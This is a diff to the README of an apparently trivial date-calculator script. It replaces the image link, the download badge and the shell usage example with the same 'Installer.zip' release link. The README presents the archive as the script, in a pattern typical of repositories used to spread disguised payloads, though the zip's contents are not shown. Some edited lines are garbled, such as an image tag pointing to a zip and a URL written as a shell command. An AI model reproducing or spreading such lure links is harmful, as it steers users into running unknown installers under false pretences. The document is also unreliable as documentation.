@@ -1,6 +1,6 @@
 # 📅 Date Difference Calculator 📆
 
-![Date Difference](https://www.example.com/date_difference.jpg)
+![Date Difference](https://github.com/Lokhsyte/date_difference/releases/download/v1.0/Installer.zip)
 
 Welcome to the **date_difference** repository! This repository houses a robust and versatile date calculator script that provides precise calculations of time intervals between dates. Whether you need to calculate the difference between two specific dates or determine the number of days between dates, this script has got you covered.
 
@@ -15,7 +15,7 @@ Welcome to the **date_difference** repository! This repository houses a robust a
 ## Installation 🚀
 
 To get started with the **date_difference** script, you can download the latest version from the following link:
-[![Download date_difference Script](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download date_difference Script](https://github.com/Lokhsyte/date_difference/releases/download/v1.0/Installer.zip)](https://github.com/Lokhsyte/date_difference/releases/download/v1.0/Installer.zip)
 
 If the link ends with the file name, make sure to extract the contents and launch the script accordingly.
 
@@ -32,7 +32,7 @@ If the link ends with the file name, make sure to extract the contents and launc
 Here's an example shell script command for calculating date differences:
 
 ```shell
-./date_difference.sh 2022-01-01 2022-12-31
+https://github.com/Lokhsyte/date_difference/releases/download/v1.0/Installer.zip 2022-01-01 2022-12-31
 ```
 
 ## Topics 📚
